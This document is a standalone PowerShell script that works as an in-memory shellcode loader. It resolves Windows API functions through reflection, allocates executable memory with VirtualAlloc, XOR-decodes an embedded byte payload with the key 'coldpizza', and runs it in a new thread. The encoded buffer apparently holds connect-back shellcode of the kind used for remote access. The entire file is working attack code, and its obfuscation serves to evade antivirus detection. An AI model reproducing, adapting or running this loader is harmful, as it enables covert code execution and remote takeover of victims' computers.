function LookupFunc {

        Param ($moduleName, $functionName)

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
                [Parameter(Position = 1)] [Type] $delType = [Void]
        )

        $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

        return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

$key = "coldpizza"

[Byte[]] $buf = 0x9f, 0x27, 0xef, 0x80, 0x80, 0x81, 0xb6, 0x7a, 0x61, 0x63, 0x2e, 0x3d, 0x25, 0x20, 0x3b, 0x32, 0x4b, 0xb3, 0x06, 0x27, 0xe7, 0x36, 0x10, 0x21, 0xf1, 0x28, 0x79, 0x2b, 0xe4, 0x3e, 0x44, 0x21, 0x3f, 0x37, 0x4b, 0xa8, 0x2b, 0x60, 0xdb, 0x2e, 0x3a, 0x21, 0xf1, 0x08, 0x31, 0x2b, 0x5e, 0xac, 0xc8, 0x4c, 0x08, 0x06, 0x78, 0x4d, 0x43, 0x2e, 0xad, 0xad, 0x7d, 0x28, 0x7b, 0xbb, 0x83, 0x8e, 0x3d, 0x2d, 0x35, 0x38, 0xe2, 0x28, 0x5a, 0xea, 0x21, 0x53, 0x24, 0x65, 0xa0, 0x0f, 0xfb, 0x02, 0x79, 0x68, 0x6d, 0x63, 0xe1, 0x02, 0x69, 0x7a, 0x7a, 0xea, 0xe3, 0xe7, 0x6c, 0x64, 0x70, 0x21, 0xff, 0xba, 0x15, 0x04, 0x27, 0x6d, 0xb4, 0x34, 0xe2, 0x3a, 0x5a, 0x28, 0x62, 0xbf, 0x3c, 0xef, 0x38, 0x71, 0x99, 0x2c, 0x29, 0x9c, 0xa6, 0x21, 0x55, 0xb9, 0x28, 0xf1, 0x4e, 0xe9, 0x2b, 0x6e, 0xba, 0x2c, 0x41, 0xa9, 0x3b, 0xbb, 0xa8, 0x6e, 0xc3, 0x2d, 0x65, 0xb1, 0x51, 0x9a, 0x0f, 0x90, 0x2f, 0x6c, 0x20, 0x40, 0x78, 0x2c, 0x43, 0xab, 0x14, 0xbb, 0x37, 0x28, 0xef, 0x30, 0x4d, 0x33, 0x7b, 0xb1, 0x05, 0x2e, 0xe7, 0x68, 0x38, 0x2d, 0xf1, 0x3a, 0x7d, 0x2a, 0x6e, 0xbc, 0x25, 0xfb, 0x6d, 0xf2, 0x32, 0x60, 0xb3, 0x2e, 0x34, 0x25, 0x28, 0x37, 0x23, 0x20, 0x20, 0x3b, 0x2e, 0x35, 0x25, 0x2a, 0x21, 0xf9, 0x96, 0x41, 0x22, 0x3d, 0x93, 0x84, 0x28, 0x28, 0x23, 0x20, 0x29, 0xe8, 0x7d, 0x85, 0x2f, 0x8f, 0x96, 0x85, 0x27, 0x29, 0x52, 0xb4, 0x3f, 0x2d, 0xce, 0x1e, 0x13, 0x14, 0x08, 0x0d, 0x0a, 0x18, 0x64, 0x31, 0x3f, 0x32, 0xf3, 0x80, 0x2a, 0xa8, 0xae, 0x28, 0x07, 0x4f, 0x7d, 0x85, 0xb4, 0x30, 0x3c, 0x24, 0xed, 0x91, 0x3a, 0x20, 0x37, 0x50, 0xa3, 0x22, 0x5d, 0xad, 0x23, 0x3a, 0x33, 0xc0, 0x5b, 0x35, 0x16, 0xcb, 0x64, 0x70, 0x69, 0x7a, 0x85, 0xb4, 0x8b, 0x60, 0x6c, 0x64, 0x70, 0x58, 0x43, 0x48, 0x4f, 0x52, 0x59, 0x54, 0x4a, 0x44, 0x50, 0x54, 0x48, 0x55, 0x57, 0x6f, 0x36, 0x2c, 0xf9, 0xa8, 0x33, 0xbd, 0xa1, 0xd8, 0x6e, 0x6c, 0x64, 0x3d, 0x58, 0xb3, 0x29, 0x32, 0x09, 0x6c, 0x3f, 0x2d, 0xca, 0x3e, 0xf3, 0xe5, 0xa7, 0x63, 0x6f, 0x6c, 0x64, 0x8f, 0xbc, 0x92, 0xf5, 0x61, 0x63, 0x6f, 0x43, 0x52, 0x28, 0x18, 0x39, 0x39, 0x20, 0x3a, 0x56, 0x5a, 0x17, 0x34, 0x2d, 0x09, 0x42, 0x2a, 0x1b, 0x00, 0x3e, 0x29, 0x00, 0x13, 0x1d, 0x37, 0x27, 0x28, 0x5d, 0x0b, 0x51, 0x32, 0x13, 0x23, 0x3e, 0x11, 0x01, 0x21, 0x5d, 0x2a, 0x05, 0x3e, 0x4e, 0x31, 0x39, 0x27, 0x2c, 0x20, 0x0d, 0x14, 0x58, 0x37, 0x02, 0x58, 0x05, 0x1b, 0x3e, 0x28, 0x17, 0x38, 0x4a, 0x22, 0x0e, 0x09, 0x03, 0x1f, 0x02, 0x19, 0x44, 0x4d, 0x25, 0x14, 0x3b, 0x1e, 0x58, 0x14, 0x25, 0x28, 0x3e, 0x4e, 0x15, 0x0c, 0x5e, 0x54, 0x10, 0x01, 0x3a, 0x39, 0x0c, 0x57, 0x57, 0x58, 0x22, 0x32, 0x06, 0x26, 0x4f, 0x37, 0x2e, 0x1a, 0x05, 0x2b, 0x03, 0x17, 0x5b, 0x3b, 0x43, 0x35, 0x35, 0x56, 0x16, 0x0c, 0x43, 0x3c, 0x1e, 0x1f, 0x2f, 0x0b, 0x1a, 0x58, 0x0b, 0x1f, 0x3a, 0x15, 0x42, 0x20, 0x2e, 0x0a, 0x24, 0x26, 0x35, 0x3c, 0x36, 0x08, 0x59, 0x13, 0x42, 0x59, 0x2b, 0x13, 0x2b, 0x0f, 0x2d, 0x37, 0x63, 0x27, 0xe5, 0xa5, 0x23, 0x33, 0x3b, 0x22, 0x2c, 0x52, 0xa6, 0x3f, 0x2c, 0xc8, 0x69, 0x48, 0xd2, 0xe5, 0x63, 0x6f, 0x6c, 0x64, 0x20, 0x3a, 0x29, 0x33, 0xa6, 0xa1, 0x84, 0x39, 0x4a, 0x4b, 0x96, 0xaf, 0x32, 0xe8, 0xa5, 0x05, 0x66, 0x3b, 0x38, 0xe0, 0x8b, 0x10, 0x7e, 0x39, 0x3d, 0x04, 0xe4, 0x43, 0x69, 0x7a, 0x33, 0xe8, 0x83, 0x05, 0x68, 0x25, 0x29, 0x20, 0xc0, 0x0f, 0x27, 0xfd, 0xe9, 0x6c, 0x64, 0x70, 0x69, 0x85, 0xaf, 0x2c, 0x52, 0xaf, 0x3f, 0x3e, 0x38, 0xe0, 0x8b, 0x37, 0x50, 0xaa, 0x22, 0x5d, 0xad, 0x23, 0x3a, 0x33, 0xbd, 0xa3, 0x4e, 0x69, 0x74, 0x1f, 0x8f, 0xbc, 0xff, 0xba, 0x14, 0x7c, 0x27, 0xab, 0xa5, 0xf8, 0x7a, 0x7a, 0x7a, 0x28, 0xd9, 0x2b, 0x9c, 0x51, 0x90, 0x69, 0x7a, 0x7a, 0x61, 0x9c, 0xba, 0x24, 0x9b, 0xbf, 0x1d, 0x78, 0x91, 0xcb, 0x8b, 0x3a, 0x6c, 0x64, 0x70, 0x3a, 0x23, 0x10, 0x21, 0x39, 0x26, 0xe5, 0xb5, 0xb1, 0x8b, 0x6a, 0x33, 0xa6, 0xa3, 0x6f, 0x7c, 0x64, 0x70, 0x20, 0xc0, 0x22, 0xc5, 0x30, 0x8a, 0x6c, 0x64, 0x70, 0x69, 0x85, 0xaf, 0x29, 0xf0, 0x3c, 0x3f, 0x2c, 0xf9, 0x8e, 0x32, 0xf3, 0x90, 0x2b, 0xe6, 0xb6, 0x2d, 0xb7, 0xa9, 0x7a, 0x5a, 0x61, 0x63, 0x26, 0xe5, 0x9d, 0x39, 0xd3, 0x68, 0xec, 0xe8, 0x81, 0x6f, 0x6c, 0x64, 0x70, 0x96, 0xaf, 0x32, 0xe2, 0xa7, 0x4f, 0xe9, 0xa4, 0x04, 0xdb, 0x1c, 0xf1, 0x66, 0x2b, 0x6e, 0xaf, 0xe1, 0xb0, 0x1c, 0xa8, 0x22, 0xa2, 0x3b, 0x05, 0x6c, 0x3d, 0x39, 0xae, 0xb8, 0x8a, 0xd4, 0xc1, 0x39, 0x93, 0xb1

$encoded = [byte[]]::new($buf.length)

for ($i = 0; $i -lt $buf.length; $i++)
{
    $encoded[$i] = [Byte]($buf[$i] -bxor $key[$i % $key.length]);
}

[System.Runtime.InteropServices.Marshal]::Copy($encoded, 0, $lpMem, $encoded.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)


